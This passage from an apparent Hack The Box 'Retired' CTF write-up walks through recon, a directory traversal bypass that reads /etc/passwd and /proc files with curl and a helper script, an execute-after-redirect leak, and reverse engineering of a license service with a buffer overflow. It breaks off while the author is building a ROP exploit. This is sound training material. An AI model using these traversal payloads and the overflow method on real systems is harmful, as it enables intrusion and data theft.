---
title: HTB: Retired
url: https://0xdf.gitlab.io/2022/08/13/htb-retired.html
date: 2022-08-13T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, hackthebox, htb-retired, nmap, feroxbuster, upload, directory-traversal, file-read, filter, bof, wfuzz, ghidra, reverse-engineering, proc, maps, gdb, pattern, mprotect, rop, jmp-rsp, msfvenom, shellcode, python, symlink, make, capabilities, cap-dac-override, binfmt-misc, sched_debug, htb-previse, htb-fingerprint, execute-after-redirect
---

![Retired](https://0xdfimages.gitlab.io/img/retired-cover.png)

Retired starts out with a file read plus a directory traversal vulnerability. (There’s also an EAR vulnerability that I originally missed, but added in later). With that, I’ll get a copy of a binary that gets fed a file via an upload on the website. There’s a buffer overflow, which I can exploit via an uploaded file. I’ll use ROP to make the stack executable, and then run a reverse shell shellcode from it. With a shell, I’ll throw a symlink into a backup directory and get an SSH key from the user. To get root, I’ll abuse binfmt\_misc. In Beyond Root, some loose ends that were annoying me.

## Box Info

| Name | [Retired](https://hackthebox.com/machines/retired)  [Retired](https://hackthebox.com/machines/retired) [Play on HackTheBox](https://hackthebox.com/machines/retired) |
| --- | --- |
| Release Date | [02 Apr 2022](https://twitter.com/hackthebox_eu/status/1547575982554431489) |
| Retire Date | 13 Aug 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Retired |
| Radar Graph | Radar chart for Retired |
| First Blood User | 02:51:27[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| First Blood Root | 03:18:07[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| Creator | [uco2KFh uco2KFh](https://app.hackthebox.com/users/590762) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.154
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-01 19:08 UTC
Nmap scan report for 10.10.11.154
Host is up (0.096s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.39 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.154
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-01 19:08 UTC
Nmap scan report for 10.10.11.154
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp open  http    nginx
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page=default.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.10 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) version, the host is likely running Debian 11 bullseye.

### Website - TCP 80

#### Site

The site is for a software development company:

[![image-20220701151255219](https://0xdfimages.gitlab.io/img/image-20220701151255219.png)](https://0xdfimages.gitlab.io/img/image-20220701151255219.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220701151255219.png)

There is a contact form at the bottom of the page, but on filling it out and submitting, there’s a link to the template’s site about how to activate the form:

![image-20220701151409744](https://0xdfimages.gitlab.io/img/image-20220701151409744.png)

No traffic is sent to the site on submitting. This is likely nothing of interest.

Everything else on the site goes to somewhere on the site, so not much enumeration here.

#### Tech Stack

On visiting `/`, it redirects to `/index.php?page=default.html`:

```

HTTP/1.1 302 Found
Server: nginx
Date: Fri, 01 Jul 2022 19:12:02 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Location: /index.php?page=default.html
Content-Length: 0

```

This is a common PHP pattern to include a page passed via a parameter.

Visiting `/default.html` loads the same page, so it’s not clear what `index.php` is providing. In fact, looking at `default.html` directly and through `index.php` shows no difference:

```

oxdf@hacky$ diff <(curl -s http://10.10.11.154/default.html) <(curl -s http://10.10.11.154/index.php?page=default.html)

```

The site is built on PHP, and uses both PHP and HTML files.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php,html` since I know the site is PHP with HTML files:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.154 -x php,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.154
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c http://10.10.11.154/ => /index.php?page=default.html
301      GET        7l       11w      162c http://10.10.11.154/js => http://10.10.11.154/js/
301      GET        7l       11w      162c http://10.10.11.154/css => http://10.10.11.154/css/
301      GET        7l       11w      162c http://10.10.11.154/assets => http://10.10.11.154/assets/
301      GET        7l       11w      162c http://10.10.11.154/assets/img => http://10.10.11.154/assets/img/
302      GET        0l        0w        0c http://10.10.11.154/index.php => /index.php?page=default.html
200      GET       72l      304w     4144c http://10.10.11.154/beta.html
301      GET        7l       11w      162c http://10.10.11.154/assets/img/about => http://10.10.11.154/assets/img/about/
301      GET        7l       11w      162c http://10.10.11.154/assets/img/logos => http://10.10.11.154/assets/img/logos/
200      GET      188l      824w    11414c http://10.10.11.154/default.html
301      GET        7l       11w      162c http://10.10.11.154/assets/img/team => http://10.10.11.154/assets/img/team/
[####################] - 2m    720000/720000  0s      found:11      errors:0      
[####################] - 2m     90000/90000   541/s   http://10.10.11.154 
[####################] - 2m     90000/90000   542/s   http://10.10.11.154/js 
[####################] - 2m     90000/90000   542/s   http://10.10.11.154/css 
[####################] - 2m     90000/90000   542/s   http://10.10.11.154/assets 
[####################] - 2m     90000/90000   542/s   http://10.10.11.154/assets/img 
[####################] - 2m     90000/90000   542/s   http://10.10.11.154/assets/img/about 
[####################] - 2m     90000/90000   543/s   http://10.10.11.154/assets/img/logos 
[####################] - 2m     90000/90000   542/s   http://10.10.11.154/assets/img/team

```

`beta.html` is the only thing new here to look at.

#### beta.html

`beta.html` (viewed directly or through `index.php`) is the page for the beta testing program for EmuEmu (one of the software mentioned on the main page).

![image-20220701153358441](https://0xdfimages.gitlab.io/img/image-20220701153358441.png)

It offers a file upload form, but anything I submit just returns an empty 200 response:

```

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 01 Jul 2022 19:26:42 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 0

```

It does mention the name of the license application, which I’ll note:

![image-20220701153507795](https://0xdfimages.gitlab.io/img/image-20220701153507795.png)

## Shell as www-data

### File Read

#### POC

Given the structure of the URL, I’ll try to read some other files. I can try to read outside of the current directory with `page=../../../../../../../etc/passwd`, but it fails and redirects to `page=default.html`. What about `index.php` itself? Visiting in Firefox returns what looks like an empty page. But looking at the source for that page reveals the PHP itself:

```

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 01 Jul 2022 19:54:46 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 348

<?php
function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
} else {
    header('Location: /index.php?page=default.html');
}

readfile($page);
?>

```

This is *not* a local file include vulnerability, but rather a file read vulnerability. This PHP is using `readfile()` to get the page, and the contents are put into the page *after* execution and thus not executed themselves (as opposed to `include` or `require`, which put the contents into the page and then execute them).

#### Read Plus Directory Traversal

With access to `index.php`, I can see why the attempt to read `/etc/passwd` failed. For `$page` to get set to something other than `default.html`, it has to return true from `preg_match("/^[a-z]/", $page)`, which means that the first character in the value needs to be a lowercase character a-z (`.` did not match).

There’s also a `sanatize_input` function, which does a replace on `../` and `./`. The replace is done once each, in that order. That means I can stack periods and slashes together in such a way that it returns what I want. For example:

```

php > $param = '.....///';
php > $param1 = str_replace("../","",$param);
php > $param2 = str_replace("./","",$param1);
php > echo $param2;
../
php > $param = '.....///.....///.....///';
php > $param1 = str_replace("../","",$param);
php > $param2 = str_replace("./","",$param1);
php > echo $param2;
../../../

```

I still need it to start with a letter. I found the `css` directory with `feroxbuster`, so I can use that, going into that directory, and then back out. With that bypass, I can read files all over the file system:

```

oxdf@hacky$ curl http://10.10.11.154/index.php?page=css/.....///.....///.....///.....///etc/passwd
root:x:0:0:root:/root:/bin/bash
...[snip]...
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000::/vagrant:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
dev:x:1001:1001::/home/dev:/bin/bash

```

#### Script

With that `curl` command, I’ll make a quick Bash script to make enumeration easier:

```

#!/bin/bash

curl http://10.10.11.154/index.php?page=css/.....///.....///.....///.....///${1}

```

It works:

```

oxdf@hacky$ ./read.sh /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...[snip]...

```

#### Alternative Read - EAR

I missed this when originally solving the box, but [IppSec’s solution](https://www.youtube.com/watch?v=1MDqn1kBHQM&t=285s) showed an execute after redirect (EAR) vulnerability in `index.php`. I’ve talked about EAR vulnerabilities before in [Previse](/2022/01/08/htb-previse.html#ear-vuln) and [Fingerprint](/2022/05/14/htb-fingerprint.html#admin).

The page redirect if the `$page` variable isn’t set or if `$page` doesn’t start with a character by setting the `Location` header:

```

...[snip]...
$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
} else {
    header('Location: /index.php?page=default.html');
}

readfile($page);
?>

```

After setting that header, the code should exit or return or `die`. Without that, it still sends a redirect, but with the body of the rest of the code, in this case, the `readfile($page)`.

To demonstrate this, I’ll want to send a `$page` that will fail that regex check, like `../../../../../../etc/passwd`. Because it fails the regex, it won’t even run through `sanitize_input` (which removes the `../`).

Visiting `10.10.11.154/index.php?page=../../../../../../etc/passwd` in Firefox just redirects to `http://10.10.11.154/index.php?page=default.html`. Looking in Burp shows the first request returns a 302, and then the next request is to `default.html`:

![image-20220816151852728](https://0xdfimages.gitlab.io/img/image-20220816151852728.png)

Looking at the actual response from the first request, it is a 302 redirecting to `index.php?page=default.html`, but the body has `/etc/passwd`:

![image-20220816151942031](https://0xdfimages.gitlab.io/img/image-20220816151942031.png)

### Enumerate Filesystem

#### activate\_license.php

The only other PHP file I’ve identified is `activate_license.php`, so I’ll read that with `curl http://10.10.11.154/index.php?page=activate_license.php`:

```

<?php
if(isset($_FILES['licensefile'])) {
    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
    $license_size = $_FILES['licensefile']['size'];

    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!$socket) { echo "error socket_create()\n"; }

    if (!socket_connect($socket, '127.0.0.1', 1337)) {
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
    }

    socket_write($socket, pack("N", $license_size));
    socket_write($socket, $license);

    socket_shutdown($socket);
    socket_close($socket);
}
?>

```

It’s taking the submitted file, and reading the contents and the size. It then creates a socket to TCP 1337 on localhost, and sends the size and then the contents, closing the socket afterwards.

Given that the response was empty, and not “error socket\_create()”, that’s a good indication that this service is running and listening on 1337.

#### activate\_license

The page hinted that the name of the program that validated licenses was `activate_license`. If I suspect that it might be in the path somewhere, I can fuzz those paths via the LFI and see if I find anything. I’ll create a wordlist using my path:

```

oxdf@hacky$ echo $PATH | tr ':' '\n' > path

```

`wfuzz` quickly finds two paths that return non-zero responses:

```

oxdf@hacky$ wfuzz -u http://10.10.11.154/index.php?page=css/.....///.....///.....///.....///FUZZ/activate_license -w path 
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.154/index.php?page=css/.....///.....///.....///.....///FUZZ/activate_license
Total requests: 11

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000002:   200        0 L      0 W      0 Ch        "/snap/bin"
000000001:   200        0 L      0 W      0 Ch        "/home/oxdf/.local/bin"
000000003:   200        0 L      0 W      0 Ch        "/usr/local/bin"
000000006:   200        0 L      0 W      0 Ch        "/usr/local/games"
000000007:   200        0 L      0 W      0 Ch        "/usr/games"
000000008:   200        0 L      0 W      0 Ch        "/usr/share/games"
000000009:   200        0 L      0 W      0 Ch        "/usr/local/sbin"
000000010:   200        0 L      0 W      0 Ch        "/usr/sbin"
000000004:   200        53 L     462 W    22501 Ch    "/usr/bin"
000000011:   200        0 L      0 W      0 Ch        "/sbin"
000000005:   200        53 L     462 W    22501 Ch    "/bin"

Total time: 0.272308
Processed Requests: 11
Filtered Requests: 0
Requests/sec.: 40.39541

```

`/bin` is commonly a symlink to `/usr/bin` now. For example, my VM:

```

oxdf@hacky$ ls -ld /bin
lrwxrwxrwx 1 root root 7 Jan 25 15:17 /bin -> usr/bin

```

I’ll download the file:

```

oxdf@hacky$ ./read.sh /usr/bin/activate_license
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.

```

It doesn’t like printing binary data to the screen. Because my script is just adding the input to the end of the `curl` command, I can add the `-o` switch here:

```

oxdf@hacky$ ./read.sh '/usr/bin/activate_license -o activate_license'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
                                 Dload  Upload   Total   Spent    Left  Speed
100 22536    0 22536    0     0  86015      0 --:--:-- --:--:-- --:--:-- 85688

```

The result is a 64-bit ELF executable:

```

oxdf@hacky$ file activate_license 
activate_license: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=554631debe5b40be0f96cabea315eedd2439fb81, for GNU/Linux 3.2.0, with debug_info, not stripped

```

### Reverse activate\_license

#### main

Opening the file in Ghidra, I’ll start at `main`. There’s a bunch of code the sets up a listening socket on a port read from the command line arguments. Eventually, there’s a `while (true)` loop:

```

  while( true ) {
    while( true ) {
      clientfd = accept(serverfd,(sockaddr *)&clientaddr,&clientaddrlen);
      if (clientfd != -1) break;
      fwrite("Error: accepting client\n",1,0x18,stderr);
    }
    inet_ntop(2,&clientaddr.sin_addr,clientaddr_s,0x10);
    printf("[+] accepted client connection from %s:%d\n",clientaddr_s,(ulong)clientaddr.sin_port);
    _Var2 = fork();
    if (_Var2 == 0) break;
    __sysv_signal(0x11,(__sighandler_t)0x1);
    close(clientfd);
  }
  close(serverfd);
  activate_license(clientfd);
                    /* WARNING: Subroutine does not return */
  exit(0);

```

This is actually fairly straight forward:

![](https://0xdfimages.gitlab.io/img/activate_license-main.png)

#### activate\_license

This function is also quite simple. There’s some setup, and then it reads four bytes from the socket and converts it to an integer in a variable I’ve named `msglen`:

```

void activate_license(int sockfd)

{
  int iVar1;
  ssize_t res;
  int *error_loc;
  char *error;
  sqlite3_stmt *stmt;
  sqlite3 *db;
  uint32_t msglen;
  char buffer [512];
  
  res = read(sockfd,&msglen,4);
  if (res == -1) {
    error_loc = __errno_location();
    error = strerror(*error_loc);
    ::error(error);
  }
  msglen = ntohl(msglen);
  printf("[+] reading %d bytes\n",(ulong)msglen);

```

Next, it reads that many bytes from the socket into a variable I’ve named `buffer`:

```

  res = read(sockfd,buffer,(ulong)msglen);
  if (res == -1) {
    error_loc = __errno_location();
    error = strerror(*error_loc);
    ::error(error);
  }

```

The rest is opening a SQLite database named `license.sqlite`, making sure a table named license exists, and then writing the data from buffer into that DB:

```

  iVar1 = sqlite3_open("license.sqlite",&db);
  if (iVar1 != 0) {
    error = (char *)sqlite3_errmsg(db);
    ::error(error);
  }
  sqlite3_busy_timeout(db,2000);
  iVar1 = sqlite3_exec(db,
                       "CREATE TABLE IF NOT EXISTS license (   id INTEGER PRIMARY KEY AUTOINCREMENT,    license_key TEXT)"
                       ,0,0,0);
  if (iVar1 != 0) {
    error = (char *)sqlite3_errmsg(db);
    ::error(error);
  }
  iVar1 = sqlite3_prepare_v2(db,"INSERT INTO license (license_key) VALUES (?)",0xffffffff,&stmt,0);
  if (iVar1 != 0) {
    error = (char *)sqlite3_errmsg(db);
    ::error(error);
  }
  iVar1 = sqlite3_bind_text(stmt,1,buffer,0x200,0);
  if (iVar1 != 0) {
    error = (char *)sqlite3_errmsg(db);
    ::error(error);
  }
  iVar1 = sqlite3_step(stmt);
  if (iVar1 != 0x65) {
    error = (char *)sqlite3_errmsg(db);
    ::error(error);
  }
  iVar1 = sqlite3_reset(stmt);
  if (iVar1 != 0) {
    error = (char *)sqlite3_errmsg(db);
    ::error(error);
  }
  iVar1 = sqlite3_finalize(stmt);
  if (iVar1 != 0) {
    error = (char *)sqlite3_errmsg(db);
    ::error(error);
  }
  iVar1 = sqlite3_close(db);
  if (iVar1 != 0) {
    error = (char *)sqlite3_errmsg(db);
    ::error(error);
  }
  printf("[+] activated license: %s\n",buffer);
  return;
}

```

It’s done in a safe way using prepared statements, so it isn’t SQL injectable.

### Buffer Overflow Fiesability

#### Vulnerability

There is a vulnerability in the code above. The user provides the length for the data that will be read from the socket (up to what can be stored in that four-byte length, so over four GB), and store it into a buffer hardcoded to 512 bytes. That gives plenty of space for a simple buffer overflow.

#### Protections

Address space randomization is enabled (checked with the file read vulnerability):

```

oxdf@hacky$ ./read.sh /proc/sys/kernel/randomize_va_space
2

```

2 indicates full randomization.

`checksec` shows that data execution prevention (DEP, or `NX`) is on, as is `PIE` and `RELRO`:

```

oxdf@hacky$ checksec activate_license
[*] '/media/sf_CTFs/hackthebox/retired-10.10.11.154/activate_license'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

Not having to worry about stack canaries is nice, but because of DEP I won’t be able to execute from the stack, because of ASLR/PIE the addresses of basically everything will be randomized, and because of RELRO the GOT and PLT tables are protected.

#### Leak PID

Because of how this program handles connections, the main process will stay the same always listening, and it will fork another child to handle the connection. The addresses in memory of for the main process will be static. Further, because of how `fork` creates an exact copy of the running process, the child processes will have the same addresses as well.

This means that if I can leak the memory maps of `activate_license`, I can use that to make a ROP chain control execution and get a reverse shell. The only way I know to do that is from `/proc/[pid]/`, but I’ll need to know the PID of the `activate_license` process.

One way to approach this is to use `wfuzz` to find it. Instead of using `-w` to pass a wordlist, I’ll use `-z range,a-b` to pass numbers from `a` to `b`. I’ll read the `cmdline` files from `/proc`, fuzzing all possible process ids. `--ss activate_license` will show any results that contain that string:

```

oxdf@hacky$ wfuzz -u 'http://10.10.11.154/index.php?page=css/.....///.....///.....///.....///proc/FUZZ/cmdline' -z range,1-65535 --ss 'activate_license'
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.154/index.php?page=css/.....///.....///.....///.....///proc/FUZZ/cmdline                        
Total requests: 65535

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000407:   200        0 L      1 W      31 Ch       "407"
                   ^C
Finishing pending requests... 

```

It finds process 407 (may be different on different boots), and I’ll kill it once it seems unlikely to find anything else.

The command line for PID 407 is what I am looking for (replacing nulls with spaces for readability):

```

oxdf@hacky$ ./read.sh '/proc/407/cmdline -o- -s' | tr '\000' ' '
/usr/bin/activate_license 1337 

```

Alternatively, depending on the options used when the kernel was compiled (see [Beyond Root](#sched_debug) for more), there may be a file in `/proc` named `sched_debug`. This file has debug information about the various CPUs, and includes a list of “runnable tasks” that includes `activate_licens[e]` and it’s PID (407):

```

...[snip]...
runnable tasks:
 S            task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
-------------------------------------------------------------------------------------------------------------
...[snip]...
 S activate_licens   407   2312253.695414        18   120         0.000000         4.064480         0.000000 0 0 /
...[snip]...

```

#### Leak Addresses

With the PID, I’ll get the `maps` file:

```

oxdf@hacky$ ./read.sh /proc/407/maps
555aa1164000-555aa1165000 r--p 00000000 08:01 2408                       /usr/bin/activate_license
555aa1165000-555aa1166000 r-xp 00001000 08:01 2408                       /usr/bin/activate_license
555aa1166000-555aa1167000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
555aa1167000-555aa1168000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
555aa1168000-555aa1169000 rw-p 00003000 08:01 2408                       /usr/bin/activate_license
555aa3078000-555aa3099000 rw-p 00000000 00:00 0                          [heap]
7f48887d6000-7f48887d8000 rw-p 00000000 00:00 0 
7f48887d8000-7f48887d9000 r--p 00000000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f48887d9000-7f48887db000 r-xp 00001000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f48887db000-7f48887dc000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f48887dc000-7f48887dd000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f48887dd000-7f48887de000 rw-p 00004000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f48887de000-7f48887e5000 r--p 00000000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f48887e5000-7f48887f5000 r-xp 00007000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f48887f5000-7f48887fa000 r--p 00017000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f48887fa000-7f48887fb000 r--p 0001b000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f48887fb000-7f48887fc000 rw-p 0001c000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f48887fc000-7f4888800000 rw-p 00000000 00:00 0 
7f4888800000-7f488880f000 r--p 00000000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f488880f000-7f48888a9000 r-xp 0000f000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f48888a9000-7f4888942000 r--p 000a9000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f4888942000-7f4888943000 r--p 00141000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f4888943000-7f4888944000 rw-p 00142000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f4888944000-7f4888969000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f4888969000-7f4888ab4000 r-xp 00025000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f4888ab4000-7f4888afe000 r--p 00170000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f4888afe000-7f4888aff000 ---p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f4888aff000-7f4888b02000 r--p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f4888b02000-7f4888b05000 rw-p 001bd000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f4888b05000-7f4888b09000 rw-p 00000000 00:00 0 
7f4888b09000-7f4888b19000 r--p 00000000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f4888b19000-7f4888c11000 r-xp 00010000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f4888c11000-7f4888c45000 r--p 00108000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f4888c45000-7f4888c49000 r--p 0013b000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f4888c49000-7f4888c4c000 rw-p 0013f000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f4888c4c000-7f4888c4e000 rw-p 00000000 00:00 0 
7f4888c53000-7f4888c54000 r--p 00000000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f4888c54000-7f4888c74000 r-xp 00001000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f4888c74000-7f4888c7c000 r--p 00021000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f4888c7d000-7f4888c7e000 r--p 00029000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f4888c7e000-7f4888c7f000 rw-p 0002a000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f4888c7f000-7f4888c80000 rw-p 00000000 00:00 0 
7ffe99226000-7ffe99247000 rw-p 00000000 00:00 0                          [stack]
7ffe9932a000-7ffe9932e000 r--p 00000000 00:00 0                          [vvar]
7ffe9932e000-7ffe99330000 r-xp 00000000 00:00 0                          [vdso]

```

This provides the location in memory for each loaded library as well as the main program. It’ll also identify areas of memory that are writable or executable.

### Generate Buffer Overflow

#### Strategy

Because of all the protections in place, I’ll need to use return oriented programming (ROP). I’ll identify small bits of code that do things like pop one or two items from the stack into various registers, and then return to some system call I want to make.

A common tactic for this kind of attack is to copy stdin, stdout, and stderr into the socket, and replace the existing process with `bash`. Unfortunately, because I’ll get feeding my exploit through the PHP page, and the PHP page just writes data into the socket and then exits, there’s no way to get data back. I’ll have to execute something that creates a reverse shell on it’s own.

I’ll take the approach of using ROP to call `mprotect` on the stack to make it executable, and then using a `JMP RSP` gadget to jump to shellcode that follows on the stack. An alternative approach would be to get a full reverse shell string into a known memory address and call `system` on it.

At this point I need:
- Offset from start of input to return address;
- Address for `mprotect`;
- Gadgets to get parameters into RDI, RSI, and RDX to make the `mprotect` call;
- Gedget for JMP RSP;
- Shellcode to return a reverse shell.

#### Get Return Offset

I’ll start the server locally:

```

oxdf@hacky$ ./activate_license 9999
[+] starting server listening on port 9999
[+] listening ...

```

And connect to it with `gdb`, letting `pidof` find the PID for me:

```

oxdf@hacky$ sudo gdb -q -p $(pidof activate_license)
Attaching to process 1109676                                                                                                           
Reading symbols from /media/sf_CTFs/hackthebox/retired-10.10.11.154/activate_license...
...[snip]...
gdb-peda$

```

I’ll make sure to set the `follow-fork-mode` to `child`, and then continue:

```

gdb-peda$ set follow-fork-mode child
gdb-peda$ c
Continuing.

```

I’ll create a pattern that’s 1024 long:

```

oxdf@hacky$ pattern_create.rb -l 1024
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B

```

I’ll send the length followed by the buffer into the listening service:

```

